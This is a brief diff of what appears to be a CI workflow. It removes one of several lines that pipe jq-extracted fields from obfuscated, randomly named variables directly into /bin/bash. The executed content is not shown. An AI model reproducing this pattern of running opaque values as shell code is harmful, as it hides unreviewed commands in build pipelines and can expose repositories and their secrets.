@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$okvj87431" | jq -r .z2131 | /bin/bash
           echo $bquea5 | jq -r .nhgno18 | /bin/bash
           echo $tug394 | jq -r .m648 | /bin/bash
-          echo $zritd27 | jq -r .fxsu60 | /bin/bash
           echo $m35883 | jq -r .m3986 | /bin/bash
 
       - name: Upload data
